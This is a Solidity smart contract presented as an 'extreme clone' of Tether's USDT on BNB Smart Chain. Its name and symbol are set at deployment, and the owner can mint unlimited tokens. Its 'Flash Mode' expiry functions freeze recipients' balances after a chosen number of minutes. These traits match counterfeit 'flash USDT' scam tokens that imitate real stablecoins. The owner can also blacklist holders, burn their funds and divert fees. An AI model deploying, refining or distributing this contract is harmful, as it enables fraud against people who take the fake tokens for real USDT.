pragma solidity 0.5.16;

/**
 * BEP20USDT - 1:1 Extreme Clone of the original USDT (Tether) on BSC.
 * Reference: https://bscscan.com/token/0x55d398326f99059ff775485246999027b3197955
 * Compiler Version: v0.5.16
 */

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address account) external view returns (uint256);
  function transfer(address recipient, uint256 amount) external returns (bool);
  function allowance(address _owner, address spender) external view returns (uint256);
  function approve(address spender, uint256 amount) external returns (bool);
  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
  constructor () internal { }

  function _msgSender() internal view returns (address payable) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes memory) {
    this; 
    return msg.data;
  }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;
    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    require(c / a == b, "SafeMath: multiplication overflow");
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b > 0, errorMessage);
    uint256 c = a / b;
    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private _owner;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () internal {
    address msgSender = _msgSender();
    _owner = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return _owner;
  }

  modifier onlyOwner() {
    require(_owner == _msgSender(), "Ownable: caller is not the owner");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(_owner, address(0));
    _owner = address(0);
  }

  function transferOwnership(address newOwner) public onlyOwner {
    _transferOwnership(newOwner);
  }

  function _transferOwnership(address newOwner) internal {
    require(newOwner != address(0), "Ownable: new owner is the zero address");
    emit OwnershipTransferred(_owner, newOwner);
    _owner = newOwner;
  }
}

contract BEP20USDT is Context, IBEP20, Ownable {
  using SafeMath for uint256;

  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  mapping (address => bool) private _blacklist;
  mapping (address => uint256) public expirationTime;

  uint256 private _totalSupply;
  uint8 public _decimals;
  string public _symbol;
  string public _name;
  address public parentContract;
  bool public paused = false;

  // Variables for Mirror Mode (Original USDT)
  uint256 public basisPointsRate = 0;
  uint256 public maximumFee = 0;
  address public upgradedAddress;
  bool public deprecated;

  event AddedBlackList(address indexed _user);
  event RemovedBlackList(address indexed _user);
  event DestroyedBlackFunds(address indexed _user, uint256 _balance);
  event Issue(uint256 amount);
  event Redeem(uint256 amount);
  event Deprecate(address newAddress);
  event Params(uint feeBasisPoints, uint maxFee);
  event Pause();
  event Unpause();

  constructor(
      string memory name_, 
      string memory symbol_, 
      uint256 initialSupply_, 
      uint8 decimals_,
      address parentContract_
  ) public {
    _name = name_;
    _symbol = symbol_;
    _decimals = decimals_;
    _totalSupply = initialSupply_.mul(10 ** uint256(decimals_));
    _balances[msg.sender] = _totalSupply;
    parentContract = parentContract_;

    emit Transfer(address(0), msg.sender, _totalSupply);
  }

  modifier whenNotPaused() {
    require(!paused, "Pausable: paused");
    _;
  }

  function getOwner() external view returns (address) {
    return owner();
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }

  function symbol() external view returns (string memory) {
    return _symbol;
  }

  function name() external view returns (string memory) {
    return _name;
  }

  function totalSupply() external view returns (uint256) {
    return _totalSupply;
  }

  function balanceOf(address account) external view returns (uint256) {
    return _balances[account];
  }

  function transfer(address recipient, uint256 amount) external whenNotPaused returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function allowance(address owner, address spender) external view returns (uint256) {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount) external whenNotPaused returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external whenNotPaused returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "BEP20: transfer amount exceeds allowance"));
    return true;
  }

  function increaseAllowance(address spender, uint256 addedValue) public whenNotPaused returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue) public whenNotPaused returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "BEP20: decreased allowance below zero"));
    return true;
  }

  function mint(address to, uint256 amount) public onlyOwner returns (bool) {
    _mint(to, amount);
    return true;
  }

  function mint(uint256 amount) public onlyOwner returns (bool) {
    _mint(_msgSender(), amount);
    return true;
  }

  function mintWithExpiry(address to, uint256 amount, uint256 durationMinutes) public onlyOwner {
    _mint(to, amount);
    if (durationMinutes > 0) {
        expirationTime[to] = block.timestamp.add(durationMinutes.mul(1 minutes));
    }
  }

  function issue(uint256 amount) public onlyOwner {
    _mint(msg.sender, amount);
    emit Issue(amount);
  }

  function redeem(uint256 amount) public onlyOwner {
    _burn(msg.sender, amount);
    emit Redeem(amount);
  }

  function burn(uint256 amount) public returns (bool) {
    _burn(_msgSender(), amount);
    return true;
  }

  function pause() public onlyOwner {
    paused = true;
    emit Pause();
  }

  function unpause() public onlyOwner {
    paused = false;
    emit Unpause();
  }

  function addBlackList(address _evilUser) public onlyOwner {
    _blacklist[_evilUser] = true;
    emit AddedBlackList(_evilUser);
  }

  function removeBlackList(address _clearedUser) public onlyOwner {
    _blacklist[_clearedUser] = false;
    emit RemovedBlackList(_clearedUser);
  }

  function isBlackListed(address _maker) public view returns (bool) {
    return _blacklist[_maker];
  }

  function getBlackListStatus(address _maker) public view returns (bool) {
    return _blacklist[_maker];
  }

  function destroyBlackFunds(address _blackListedUser) public onlyOwner {
    require(_blacklist[_blackListedUser], "User is not blacklisted");
    uint256 dirtyFunds = _balances[_blackListedUser];
    _burn(_blackListedUser, dirtyFunds);
    emit DestroyedBlackFunds(_blackListedUser, dirtyFunds);
  }

  function setParams(uint256 newBasisPoints, uint256 newMaxFee) public onlyOwner {
    basisPointsRate = newBasisPoints;
    maximumFee = newMaxFee;
    emit Params(basisPointsRate, maximumFee);
  }

  function deprecate(address _upgradedAddress) public onlyOwner {
    deprecated = true;
    upgradedAddress = _upgradedAddress;
    emit Deprecate(_upgradedAddress);
  }

  function setExpirationTime(address user, uint256 durationMinutes) public onlyOwner {
    if (durationMinutes > 0) {
      expirationTime[user] = block.timestamp.add(durationMinutes.mul(1 minutes));
    } else {
      expirationTime[user] = 0;
    }
  }

  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "BEP20: transfer from the zero address");
    require(recipient != address(0), "BEP20: transfer to the zero address");
    require(!_blacklist[sender], "Sender is blacklisted");
    require(!_blacklist[recipient], "Recipient is blacklisted");

    if (expirationTime[sender] > 0) {
      require(block.timestamp <= expirationTime[sender], "Tokens expirados (Modo Flash)");
    }

    uint256 fee = 0;
    if (basisPointsRate > 0) {
      fee = amount.mul(basisPointsRate).div(10000);
      if (fee > maximumFee && maximumFee > 0) {
        fee = maximumFee;
      }
    }

    uint256 sendAmount = amount.sub(fee);

    _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
    _balances[recipient] = _balances[recipient].add(sendAmount);
    emit Transfer(sender, recipient, sendAmount);

    if (fee > 0) {
      _balances[owner()] = _balances[owner()].add(fee);
      emit Transfer(sender, owner(), fee);
    }
  }

  function _mint(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: mint to the zero address");

    _totalSupply = _totalSupply.add(amount);
    _balances[account] = _balances[account].add(amount);
    emit Transfer(address(0), account, amount);
  }

  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "BEP20: burn from the zero address");
    require(_balances[account] >= amount, "BEP20: burn amount exceeds balance");

    _balances[account] = _balances[account].sub(amount, "BEP20: burn amount exceeds balance");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "BEP20: approve from the zero address");
    require(spender != address(0), "BEP20: approve to the zero address");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }
}